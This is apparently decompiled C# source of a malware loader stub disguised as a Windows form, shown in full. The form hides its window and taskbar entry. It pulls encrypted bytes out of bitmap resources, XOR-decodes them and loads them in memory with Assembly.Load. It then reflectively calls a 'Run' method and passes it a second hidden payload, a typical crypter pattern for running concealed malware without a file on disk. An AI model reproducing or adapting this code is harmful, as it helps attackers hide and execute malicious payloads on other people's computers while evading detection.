using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;

public class frmMain : Form
{
	public static Assembly assembly;

	public static byte[] Asm;

	public static byte[] data;

	public static object[] invoke;

	public static string Persistance;

	public static ComponentResourceManager manager2;

	public frmMain()
	{
		InitializeComponent();
		assembly = Assembly.Load(Asm);
		Initiate("Run", new object[4]
		{
			0,
			"",
			GetResource("a"),
			false
		});
	}

	public static void tick_Tick(object sender, EventArgs e)
	{
	}

	public static void tick2_Tick(object sender, EventArgs e)
	{
	}

	private static byte[] GetResource(string ResName)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		return DXOR(Options.GetStuff((Bitmap)manager2.GetObject(ResName)), new byte[1], 10);
	}

	private void InitializeComponent()
	{
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(frmMain));
		manager2 = new ComponentResourceManager(typeof(frmMain));
		Asm = DXOR(Options.GetStuff((Bitmap)componentResourceManager.GetObject("b")), new byte[1], 10);
		((Control)this).SuspendLayout();
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
		((Control)this).set_Visible(false);
		((Form)this).set_WindowState((FormWindowState)1);
	}

	public static object Initiate(string n, object[] t)
	{
		invoke = t;
		return AquireData(n);
	}

	public static byte[] DXOR(byte[] input, byte[] key, int amount)
	{
		for (int i = 0; i < input.Length; i++)
		{
			input[i] ^= (byte)((key[i % key.Length] >> i + amount + key.Length) & 0xFF);
		}
		return input;
	}

	public static object AquireData(string name)
	{
		Type type = assembly.GetType("It");
		MethodInfo[] methods = type.GetMethods();
		MethodInfo methodInfo = null;
		int num = 0;
		while (true)
		{
			if (num < methods.Length)
			{
				methodInfo = methods[num];
				if (methodInfo.Name == name)
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return methodInfo.Invoke(null, invoke);
	}
}
